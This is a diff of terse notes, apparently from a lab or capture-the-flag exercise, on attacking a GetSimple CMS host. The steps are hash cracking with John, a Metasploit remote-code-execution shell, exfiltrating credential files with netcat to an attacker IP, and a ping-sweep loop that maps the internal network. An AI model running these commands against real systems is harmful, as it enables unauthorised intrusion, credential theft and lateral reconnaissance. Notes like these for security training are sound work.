@@ -7,6 +7,8 @@ url bar go to to the server/data
 find hash
 crack it with john
 
+*****MSF CONSOLE*******
+
 open msf console search getsimple
 use remote code exec
 gets you a meterpreter shell
@@ -14,3 +16,13 @@ switch to shell
 exil creds for cracking
 ***nc -lvnp 1234** on attacker
 nc <attackerIP> 1234 < filename.txt
+
+switch to env /bin/sh
+test whoami
+ifconfig
+
+now you can do a ping sweep for that internal IP range
+for i in $(seq 1 254); do ping -c 1 -w 1 192.168.1.$i > /dev/null && echo "192.168.1.$i is up"; done
+X.X.X.21
+X.X.X.80
+X.X.X.129
